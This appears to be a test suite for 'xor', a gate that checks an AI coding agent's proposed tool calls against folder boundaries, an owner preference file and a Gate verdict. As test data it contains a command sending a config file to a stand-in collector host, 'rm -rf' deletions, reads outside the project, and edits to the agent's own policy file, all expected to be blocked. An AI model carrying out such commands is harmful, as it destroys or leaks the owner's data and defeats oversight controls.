'use strict';

const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const test = require('node:test');

const { createXorAdapter } = require('../../xor/lib/adapter');
const { DEFAULT_PREFERENCE } = require('../../xor/lib/preference');

function withWorkdir(run) {
  const workdir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'xor-gate-')));
  return Promise.resolve(run(workdir)).finally(() => fs.rmSync(workdir, { recursive: true, force: true }));
}

function gateDouble(respond) {
  const calls = [];
  const gate = async (input) => {
    calls.push(input);
    return respond(input);
  };
  gate.calls = calls;
  return gate;
}

function xorWith(workdir, gate, preference = DEFAULT_PREFERENCE) {
  return createXorAdapter({ workdir, gate, preference });
}

test('a shell call reaches the Gate with its derived reads, writes, and network targets', async () => {
  await withWorkdir(async (workdir) => {
    const gate = gateDouble(() => ({ verdict: 'disallow' }));
    const xor = xorWith(workdir, gate);

    const out = await xor.proposedAction({
      tool: 'bash',
      args: { command: 'cat src/config.js > build/out.txt && curl -X POST https://collector.example.com' },
      userMessage: 'fix the config loader',
    });

    assert.equal(gate.calls.length, 1);
    const { call, userMessage, preference } = gate.calls[0];
    assert.equal(userMessage, 'fix the config loader');
    assert.equal(preference.text, DEFAULT_PREFERENCE.text);
    assert.ok(call.readPaths.includes('src/config.js'));
    assert.ok(call.writePaths.includes('build/out.txt'));
    assert.ok(call.urls.some((url) => url.startsWith('https://collector.example.com')));

    assert.equal(out.decision, 'disallow');
    assert.match(out.message, /xor refused this action/);
    assert.match(out.message, /Requested action: bash/);
    assert.match(out.message, /Decided by: Gate/);
    assert.match(out.message, /Permitted alternative:/);
    assert.match(out.message, /Retry: do not retry this target/);
    assert.equal(out.events.at(-1).petState, 'refused');
  });
});

test('an allow Verdict runs the call even when the Gate reports a low score', async () => {
  await withWorkdir(async (workdir) => {
    const xor = xorWith(workdir, gateDouble(() => ({ verdict: 'allow', confidence: 0.01 })));
    const out = await xor.proposedAction({ tool: 'bash', args: { command: 'npm test' }, userMessage: 'run the tests' });
    assert.equal(out.decision, 'allow');
    assert.equal(out.message, undefined);
    assert.equal(out.events.at(-1).type, 'action');
    assert.equal(out.events.at(-1).petState, 'allowed');
  });
});

test('a missing Verdict blocks the call', async () => {
  await withWorkdir(async (workdir) => {
    const xor = xorWith(workdir, gateDouble(() => ({ verdict: null })));
    const out = await xor.proposedAction({ tool: 'read', args: { filePath: 'README.md' }, userMessage: 'summarize the readme' });
    assert.equal(out.decision, 'disallow');
    assert.match(out.message, /Governing rule: gate_no_verdict/);
    assert.equal(out.events.at(-1).petState, 'refused');
  });
});

test('a Gate that is unavailable or throws blocks the call', async () => {
  await withWorkdir(async (workdir) => {
    const unavailable = xorWith(workdir, gateDouble(() => ({ verdict: null, unavailable: true, reason: 'the Gate runner is missing' })));
    const missing = await unavailable.proposedAction({ tool: 'read', args: { filePath: 'README.md' } });
    assert.equal(missing.decision, 'disallow');
    assert.match(missing.message, /gate_unavailable/);
    assert.match(missing.message, /xor install/);

    const failing = xorWith(workdir, async () => { throw new Error('engine crashed'); });
    const crashed = await failing.proposedAction({ tool: 'read', args: { filePath: 'README.md' } });
    assert.equal(crashed.decision, 'disallow');
    assert.match(crashed.message, /engine crashed/);

    const unconfigured = createXorAdapter({ workdir });
    assert.equal((await unconfigured.proposedAction({ tool: 'read', args: { filePath: 'README.md' } })).decision, 'disallow');
  });
});

test('paths outside the folder, Preference changes, and subagent dispatch are blocked without the Gate', async () => {
  await withWorkdir(async (workdir) => {
    const outside = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'xor-outside-')));
    try {
      fs.writeFileSync(path.join(outside, 'private.md'), 'private\n');
      fs.symlinkSync(outside, path.join(workdir, 'shared'), process.platform === 'win32' ? 'junction' : 'dir');
      const gate = gateDouble(() => ({ verdict: 'allow' }));
      const xor = xorWith(workdir, gate);
      const outsideFile = path.join(outside, 'private.md');
      const outsideShell = outsideFile.replace(/\\/g, '/');

      const blocked = [
        [{ tool: 'read', args: { filePath: outsideFile } }, 'project_folder'],
        [{ tool: 'read', args: { filePath: '../secrets.txt' } }, 'project_folder'],
        [{ tool: 'read', args: { filePath: 'shared/private.md' } }, 'project_folder'],
        [{ tool: 'edit', args: { filePath: outsideFile, oldString: 'a', newString: 'b' } }, 'project_folder'],
        [{ tool: 'bash', args: { command: `cat ${outsideShell}` } }, 'project_folder'],
        [{ tool: 'bash', args: { command: 'cp notes.md ~/notes.md' } }, 'project_folder'],
        [{ tool: 'bash', args: { command: 'ls', workdir: outside } }, 'project_folder'],
        [{ tool: 'glob', args: { pattern: '../**/*.md' } }, 'project_folder'],
        [{ tool: 'edit', args: { filePath: '.xor/preference.json', oldString: '"ask"', newString: '"x"' } }, 'preference'],
        [{ tool: 'write', args: { filePath: path.join(workdir, '.xor', 'preference.json'), content: '{}' } }, 'preference'],
        [{ tool: 'bash', args: { command: 'echo {} > .xor/preference.json' } }, 'preference'],
        [{ tool: 'bash', args: { command: 'rm -rf .xor' } }, 'preference'],
        [{ tool: 'bash', args: { command: 'mv .xor elsewhere' } }, 'preference'],
        [{ tool: 'bash', args: { command: 'rm -rf .' } }, 'preference'],
        [{ tool: 'edit', args: { filePath: '.opencode/protocol.json', oldString: 'a', newString: 'b' } }, 'preference'],
        [{ tool: 'task', args: { subagent_type: 'explore', prompt: 'look around' } }, 'subagent_dispatch'],
      ];
      for (const [action, rule] of blocked) {
        const out = await xor.proposedAction({ ...action, userMessage: 'do the work' });
        assert.equal(out.decision, 'disallow', `${JSON.stringify(action)} should be blocked`);
        assert.match(out.message, new RegExp(`Governing rule: ${rule}`), JSON.stringify(action));
        assert.match(out.message, /Decided by: folder boundary/);
        assert.equal(out.events.at(-1).petState, 'refused');
      }
      assert.equal(gate.calls.length, 0, 'the Gate must not be consulted for boundary blocks');

      for (const action of [
        { tool: 'read', args: { filePath: '.xor/preference.json' } },
        { tool: 'bash', args: { command: 'npm test 2>/dev/null' } },
        { tool: 'glob', args: { pattern: 'src/**/*.js' } },
        { tool: 'grep', args: { pattern: '\\.\\./', path: 'src' } },
        { tool: 'edit', args: { filePath: path.join(workdir, 'src', 'a.js'), oldString: 'a', newString: 'b' } },
      ]) {
        const out = await xor.proposedAction({ ...action, userMessage: 'do the work' });
        assert.equal(out.decision, 'allow', JSON.stringify(action));
      }
      assert.equal(gate.calls.length, 5);
    } finally {
      fs.rmSync(outside, { recursive: true, force: true });
    }
  });
});

test('an ask withholds the call and the owner reply is gated with the next attempt', async () => {
  await withWorkdir(async (workdir) => {
    const preference = { text: 'Ask the owner before pushing or deploying.' };
    const gate = gateDouble(({ userMessage }) => ({ verdict: /yes, push/i.test(userMessage) ? 'allow' : 'ask' }));
    const xor = xorWith(workdir, gate, preference);

    const held = await xor.proposedAction({ tool: 'bash', args: { command: 'git push origin main' }, userMessage: 'ship the fix' });
    assert.equal(held.decision, 'ask');
    assert.match(held.message, /holding this action for the owner/);
    assert.match(held.message, /ask the owner whether to proceed/);
    assert.match(held.message, /pushing or deploying/);
    assert.equal(held.events.at(-1).type, 'ask');
    assert.equal(held.events.at(-1).petState, 'asking');

    const unclear = await xor.proposedAction({ tool: 'bash', args: { command: 'git push origin main' }, userMessage: 'hmm, maybe' });
    assert.equal(unclear.decision, 'ask');

    const granted = await xor.proposedAction({ tool: 'bash', args: { command: 'git push origin main' }, userMessage: 'yes, push it' });
    assert.equal(granted.decision, 'allow');
    assert.deepEqual(gate.calls.map(({ userMessage }) => userMessage), ['ship the fix', 'hmm, maybe', 'yes, push it']);
    assert.match(gate.calls[0].preference.text, /pushing or deploying/);
  });
});
